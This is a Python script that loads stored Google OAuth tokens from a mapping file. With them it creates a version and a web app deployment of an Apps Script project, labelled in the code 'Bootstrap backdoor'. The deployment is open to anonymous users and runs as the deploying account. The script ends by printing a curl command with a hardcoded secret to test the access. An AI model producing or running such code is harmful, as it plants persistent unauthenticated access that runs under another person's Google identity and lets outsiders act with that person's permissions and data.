import json
from google.oauth2.credentials import Credentials
from google.auth.transport.requests import Request
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError

with open("script_to_token_map.json") as f:
    stmap = json.load(f)

script_id = list(stmap["map"].keys())[0]
token_file = list(stmap["map"].values())[0]

print(f"Probing script: {script_id}")
print(f"Token: {token_file}")

creds = Credentials.from_authorized_user_file(token_file)
if creds.expired and creds.refresh_token:
    creds.refresh(Request())

svc = build("script", "v1", credentials=creds, cache_discovery=False)

# Create a version first (deployments need a version number)
try:
    ver = svc.projects().versions().create(
        scriptId=script_id,
        body={"description": "webapp bootstrap"}
    ).execute()
    vnum = ver["versionNumber"]
    print(f"✅ Created version {vnum}")
except HttpError as e:
    print(f"❌ Version failed: {e.content.decode()[:500]}")
    raise

# Create the web app deployment
try:
    dep = svc.projects().deployments().create(
        scriptId=script_id,
        body={
            "deploymentConfig": {
                "scriptId": script_id,
                "versionNumber": vnum,
                "manifestFileName": "appsscript",
                "description": "Bootstrap backdoor",
                "entryPoints": [
                    {
                        "entryPointType": "WEB_APP",
                        "webApp": {
                            "access": "ANYONE_ANONYMOUS",
                            "executeAs": "USER_DEPLOYING"
                        }
                    }
                ]
            }
        }
    ).execute()
    dep_id = dep["deploymentId"]
    # The URL may be nested in entryPoints
    url = None
    for ep in dep.get("entryPoints", []):
        if ep.get("entryPointType") == "WEB_APP":
            url = ep.get("webApp", {}).get("url")
            break
    print(f"✅ Deployment created: {dep_id}")
    print(f"🌐 Web App URL: {url}")
    if url:
        print(f"\nNow test it:")
        print(f"curl '{url}?secret=GUO_BOOTSTRAP_2026_SECRET'")
except HttpError as e:
    print(f"❌ Deployment failed: {e.content.decode()[:800]}")
